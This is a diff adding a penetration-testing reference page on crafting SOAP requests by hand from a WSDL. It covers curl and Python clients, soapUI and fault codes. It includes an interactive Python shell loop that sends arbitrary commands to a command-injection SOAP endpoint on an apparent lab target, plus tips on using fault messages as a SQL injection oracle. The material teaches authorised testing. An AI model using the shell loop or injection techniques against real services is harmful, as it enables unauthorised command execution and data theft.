@@ -1,0 +1,427 @@
+---
+title: SOAP Basics
+description: Crafting SOAP requests from a WSDL by hand - envelope structure recap, the minimum boilerplate for a working request, curl invocation with Content-Type and SOAPAction headers, Python client with the requests library, the soapUI tool when you want a GUI, and how to interpret fault responses to debug malformed envelopes.
+mitre: [T1190, T1213]
+d3fend: [D3-RAPA]
+impact: [DataExfil]
+owasp: [A05]
+sidebar:
+  order: 3
+  label: SOAP basics
+---
+
+## TL;DR
+
+Once you have the WSDL, manual SOAP requests are mechanical. The minimum payload structure for any SOAP request is the same; only the operation name and parameter list change per call.
+
+```
+# Template - replace OPERATION and PARAMS for each operation
+<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
+               xmlns:tns="http://tempuri.org/">
+  <soap:Body>
+    <OPERATIONRequest xmlns="http://tempuri.org/">
+      <param1>value1</param1>
+      <param2>value2</param2>
+    </OPERATIONRequest>
+  </soap:Body>
+</soap:Envelope>
+
+# Send via curl
+curl -X POST http://target:3002/wsdl \
+     -H 'Content-Type: text/xml; charset=utf-8' \
+     -H 'SOAPAction: "Login"' \
+     --data @login.xml
+
+# Or via Python
+requests.post(url, data=payload, headers={
+    'Content-Type': 'text/xml; charset=utf-8',
+    'SOAPAction': '"Login"',
+})
+```
+
+Success indicator: a 200 response with a `<OPERATIONResponse>` body element containing the operation's output. A `<soap:Fault>` response means the request reached the parser but failed validation.
+
+## The minimum SOAP request
+
+A SOAP request needs three pieces:
+
+1. **Envelope** - XML wrapper that declares the SOAP namespace
+2. **Body** - contains the operation name and parameters
+3. **HTTP headers** - `Content-Type: text/xml` (or `application/soap+xml` for SOAP 1.2) and `SOAPAction: "<operation>"`
+
+Everything else (Header block, Fault block) is optional. The minimum working request:
+
+```xml
+<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <LoginRequest xmlns="http://tempuri.org/">
+      <username>admin</username>
+      <password>password</password>
+    </LoginRequest>
+  </soap:Body>
+</soap:Envelope>
+```
+
+Sent as:
+
+```http
+POST /wsdl HTTP/1.1
+Host: target:3002
+Content-Type: text/xml; charset=utf-8
+SOAPAction: "Login"
+Content-Length: 198
+
+<?xml version="1.0" encoding="utf-8"?>...
+```
+
+That's the whole protocol. The XML can be on one line or pretty-printed; both work.
+
+## Building the request from a WSDL
+
+Given this WSDL fragment from [Discovery](/codex/web/web-services/discovery/):
+
+```xml
+<wsdl:types>
+  <s:element name="LoginRequest">
+    <s:complexType>
+      <s:sequence>
+        <s:element minOccurs="1" maxOccurs="1" name="username" type="s:string"/>
+        <s:element minOccurs="1" maxOccurs="1" name="password" type="s:string"/>
+      </s:sequence>
+    </s:complexType>
+  </s:element>
+</wsdl:types>
+
+<wsdl:binding name="HacktheboxServiceSoapBinding" type="tns:HacktheBoxSoapPort">
+  <wsdl:operation name="Login">
+    <soap:operation soapAction="Login" style="document"/>
+    ...
+  </wsdl:operation>
+</wsdl:binding>
+```
+
+The mapping to a request:
+
+| WSDL element | Where it appears in the request |
+| --- | --- |
+| `<s:element name="LoginRequest">` | Root element inside `<soap:Body>` |
+| `targetNamespace="http://tempuri.org/"` | `xmlns="..."` attribute on the root operation element |
+| `<s:element name="username" type="s:string"/>` | `<username>VALUE</username>` child of the operation element |
+| `<s:element name="password" type="s:string"/>` | `<password>VALUE</password>` child of the operation element |
+| `soapAction="Login"` (from binding) | `SOAPAction: "Login"` HTTP header |
+
+So the full request becomes:
+
+```xml
+<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <LoginRequest xmlns="http://tempuri.org/">
+      <username>admin</username>
+      <password>password</password>
+    </LoginRequest>
+  </soap:Body>
+</soap:Envelope>
+```
+
+The `xmlns="http://tempuri.org/"` on `<LoginRequest>` is critical - without it the server may not recognize the operation. This namespace comes from the WSDL's `targetNamespace` attribute.
+
+### Namespace prefixes - pragmatics
+
+You'll see different namespace styles in the wild. All three of these are equivalent:
+
+```xml
+<!-- Style 1: default namespace on operation element -->
+<soap:Body>
+  <LoginRequest xmlns="http://tempuri.org/">
+    <username>admin</username>
+  </LoginRequest>
+</soap:Body>
+
+<!-- Style 2: namespace prefix declared upfront, used on every element -->
+<soap:Envelope xmlns:soap="..." xmlns:tns="http://tempuri.org/">
+  <soap:Body>
+    <tns:LoginRequest>
+      <tns:username>admin</tns:username>
+    </tns:LoginRequest>
+  </soap:Body>
+</soap:Envelope>
+
+<!-- Style 3: explicit prefix only on operation, default on children -->
+<soap:Body>
+  <tns:LoginRequest xmlns:tns="http://tempuri.org/">
+    <username>admin</username>
+  </tns:LoginRequest>
+</soap:Body>
+```
+
+When testing, start with style 1 (simplest) and only complicate if the server rejects. Some servers are strict about namespace matching - if a request fails with "operation not found," try moving the namespace declaration or adding a `tns:` prefix to the operation element.
+
+## Sending the request - curl
+
+```shell
+# 1. Save the envelope to a file
+$ cat > /tmp/login.xml <<'EOF'
+<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <LoginRequest xmlns="http://tempuri.org/">
+      <username>admin</username>
+      <password>P@ssw0rd</password>
+    </LoginRequest>
+  </soap:Body>
+</soap:Envelope>
+EOF
+
+# 2. Send
+$ curl -X POST http://target:3002/wsdl \
+       -H 'Content-Type: text/xml; charset=utf-8' \
+       -H 'SOAPAction: "Login"' \
+       --data @/tmp/login.xml
+
+<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <LoginResponse xmlns="http://tempuri.org/">
+      <success>true</success>
+      <result>Welcome, admin</result>
+    </LoginResponse>
+  </soap:Body>
+</soap:Envelope>
+```
+
+Three points:
+
+- `Content-Type` must be `text/xml` or `application/soap+xml`. Without it, many servers return `415 Unsupported Media Type`.
+- `SOAPAction` value is **quoted** - `SOAPAction: "Login"` not `SOAPAction: Login`. Most servers tolerate the unquoted form, but the spec requires quotes.
+- `--data @file.xml` reads from a file. For inline `--data '<?xml...>'`, escape internal quotes carefully or use `--data-binary @file`.
+
+### Common curl errors
+
+| Error | Cause |
+| --- | --- |
+| `415 Unsupported Media Type` | Missing or wrong `Content-Type` header |
+| `400 Bad Request` | Malformed XML - usually missing namespace declaration |
+| `500 Internal Server Error` + `<soap:Fault>` | Operation reached parser but parameters invalid or auth failed |
+| Empty response | Sometimes a SOAP server returns 200 with empty body when the operation succeeded but produced no output - check status code, not body length |
+| `404` | Wrong endpoint URL (not the WSDL location); check `<soap:address location="..."/>` |
+
+## Sending the request - Python
+
+For automation, scripting against multiple operations, or when you need to manipulate the payload programmatically:
+
+```python
+import requests
+
+payload = '''<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <LoginRequest xmlns="http://tempuri.org/">
+      <username>admin</username>
+      <password>P@ssw0rd</password>
+    </LoginRequest>
+  </soap:Body>
+</soap:Envelope>'''
+
+response = requests.post(
+    'http://target:3002/wsdl',
+    data=payload,
+    headers={
+        'Content-Type': 'text/xml; charset=utf-8',
+        'SOAPAction': '"Login"',
+    },
+)
+print(response.text)
+```
+
+### Templated client for multiple operations
+
+```python
+import requests
+
+URL = 'http://target:3002/wsdl'
+NAMESPACE = 'http://tempuri.org/'
+
+def soap_call(operation, params, soap_action=None):
+    """Make a SOAP call. operation is the element name; params is a dict."""
+    soap_action = soap_action or operation
+    body_inner = ''.join(f'<{k}>{v}</{k}>' for k, v in params.items())
+    payload = f'''<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <{operation}Request xmlns="{NAMESPACE}">
+      {body_inner}
+    </{operation}Request>
+  </soap:Body>
+</soap:Envelope>'''
+    return requests.post(URL, data=payload, headers={
+        'Content-Type': 'text/xml; charset=utf-8',
+        'SOAPAction': f'"{soap_action}"',
+    })
+
+# Call each operation from the WSDL
+print(soap_call('Login', {'username': 'admin', 'password': 'P@ssw0rd'}).text)
+print(soap_call('ExecuteCommand', {'cmd': 'whoami'}).text)
+```
+
+This pattern is useful when you've discovered many operations and want to systematically test each one.
+
+### Interactive shell pattern
+
+For command-injection / RCE-style SOAP services, an interactive shell is convenient:
+
+```python
+import requests
+
+URL = 'http://target:3002/wsdl'
+
+while True:
+    try:
+        cmd = input('$ ')
+    except (EOFError, KeyboardInterrupt):
+        break
+    payload = f'''<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <LoginRequest xmlns="http://tempuri.org/">
+      <cmd>{cmd}</cmd>
+    </LoginRequest>
+  </soap:Body>
+</soap:Envelope>'''
+    r = requests.post(URL, data=payload, headers={
+        'Content-Type': 'text/xml; charset=utf-8',
+        'SOAPAction': '"ExecuteCommand"',
+    })
+    print(r.text)
+```
+
+Reads commands from stdin in a loop, fires each as a SOAP request. Useful for the SOAPAction-spoofing scenario where the body operation differs from the SOAPAction header - see [SOAPAction spoofing](/codex/web/web-services/soapaction-spoofing/).
+
+## The soapUI tool
+
+[soapUI](https://www.soapui.org/) is a GUI tool for SOAP testing. When manual curl gets tedious:
+
+```shell
+# Install (Linux)
+$ sudo apt install soapui
+
+# Or download from soapui.org for Windows/Mac
+```
+
+Workflow:
+
+1. New SOAP Project → paste WSDL URL or upload `.wsdl` file
+2. soapUI auto-generates request templates for every operation
+3. Edit the parameters and click "Submit Request"
+4. Response renders in a parallel panel
+
+soapUI strengths:
+- Automatic envelope construction from WSDL
+- Schema validation before sending
+- Built-in WS-Security support (for signed/encrypted SOAP)
+- Saved test suites for reuse
+
+For penetration testing specifically, soapUI is comfortable for exploration but Burp Suite (intercepting your hand-crafted curl requests) is usually faster for adversarial probing - you have more direct control over the bytes.
+
+### Burp + soapUI hybrid
+
+A common workflow:
+
+1. Use soapUI to generate the request template from the WSDL
+2. Copy the request into Burp Repeater
+3. From Burp, modify, fuzz, scan, etc.
+
+soapUI does the boilerplate, Burp does the attack tooling.
+
+## Reading SOAP fault responses
+
+When a request fails inside the SOAP layer (rather than at the HTTP layer), the server returns a `<soap:Fault>` element with diagnostic information:
+
+```xml
+<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <soap:Fault>
+      <faultcode>soap:Client</faultcode>
+      <faultstring>Object reference not set to an instance of an object.</faultstring>
+      <detail>
+        <ExceptionType>System.NullReferenceException</ExceptionType>
+        <StackTrace>at MyService.Authenticate(String username, String password)</StackTrace>
+      </detail>
+    </soap:Fault>
+  </soap:Body>
+</soap:Envelope>
+```
+
+`<faultcode>` is one of:
+
+| Code | Meaning |
+| --- | --- |
+| `soap:VersionMismatch` | SOAP envelope namespace wrong |
+| `soap:MustUnderstand` | Required `<soap:Header>` block missing |
+| `soap:Client` | Request was malformed or invalid |
+| `soap:Server` | Server-side error processing the request |
+
+`<faultstring>` is human-readable. `<detail>` (optional) often leaks information valuable to the attacker: exception types, stack traces, internal class names, file paths.
+
+When a fault response contains a stack trace, it's the SOAP equivalent of a development-mode error page - read it carefully, it often reveals the back-end framework (`.NET WCF`, `Java JAX-WS`, `PHP NuSOAP`), the database (`System.Data.SqlClient.SqlException`), and the actual SQL or operation that failed.
+
+### Fault as oracle for SQL injection
+
+Particularly useful: SQL errors that surface through SOAP faults give you a clear "your injection worked syntactically, but here's the error from the DB" signal:
+
+```xml
+<faultstring>
+  SQLite error: near "'": syntax error
+</faultstring>
+```
+
+That's a SQLite injection-positive signal - see [Skill assessment chain](/codex/web/web-services/skill-assessment-chain/) for the full SQL injection through SOAP walkthrough.
+
+## SOAP 1.1 vs SOAP 1.2
+
+Two versions of the SOAP spec exist. Quick distinguishing features:
+
+| Feature | SOAP 1.1 | SOAP 1.2 |
+| --- | --- | --- |
+| Envelope namespace | `http://schemas.xmlsoap.org/soap/envelope/` | `http://www.w3.org/2003/05/soap-envelope` |
+| Content-Type | `text/xml` | `application/soap+xml` |
+| SOAPAction header | Required | Replaced by `action` parameter in Content-Type |
+| Fault structure | `<faultcode>`, `<faultstring>` | `<Code>`, `<Reason>`, etc. |
+
+Almost everything you encounter in the wild is SOAP 1.1. WCF services sometimes expose both via different endpoints (`?wsdl` vs `?singleWsdl`). For 1.2:
+
+```http
+POST /wsdl HTTP/1.1
+Content-Type: application/soap+xml; charset=utf-8; action="Login"
+
+<?xml version="1.0"?>
+<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
+  ...
+</soap:Envelope>
+```
+
+Note: no separate `SOAPAction:` header in 1.2 - the action moved into Content-Type. Otherwise the payload structure is similar.
+
+## Quick reference
+
+| Task | Pattern |
+| --- | --- |
+| Minimum envelope | `<soap:Envelope xmlns:soap="..."><soap:Body><OPRequest xmlns="..."><param>v</param></OPRequest></soap:Body></soap:Envelope>` |
+| SOAP namespace 1.1 | `http://schemas.xmlsoap.org/soap/envelope/` |
+| SOAP namespace 1.2 | `http://www.w3.org/2003/05/soap-envelope` |
+| Content-Type 1.1 | `text/xml; charset=utf-8` |
+| Content-Type 1.2 | `application/soap+xml; charset=utf-8; action="OP"` |
+| SOAPAction header | `SOAPAction: "OperationName"` (quoted) |
+| Send via curl | `curl -X POST URL -H 'Content-Type: text/xml' -H 'SOAPAction: "OP"' --data @file.xml` |
+| Python client | `requests.post(URL, data=payload, headers={...})` |
+| GUI client | soapUI (load WSDL, click submit) |
+| Fault response indicates | Request reached parser; check `<faultstring>` for details |
+| 415 response | Wrong Content-Type |
+| 400 response | Malformed XML |
+| 500 + Fault | Server-side error, often informative |
+| Generate templates from WSDL | soapUI auto-generation, or `wsdl2py`/`wsdl2java`/`svcutil.exe` |
+
+For the canonical SOAP-specific bypass attack, continue to [SOAPAction spoofing](/codex/web/web-services/soapaction-spoofing/). For the end-to-end skill-assessment chain combining SOAPAction spoofing with SQL injection, see [Skill assessment chain](/codex/web/web-services/skill-assessment-chain/).
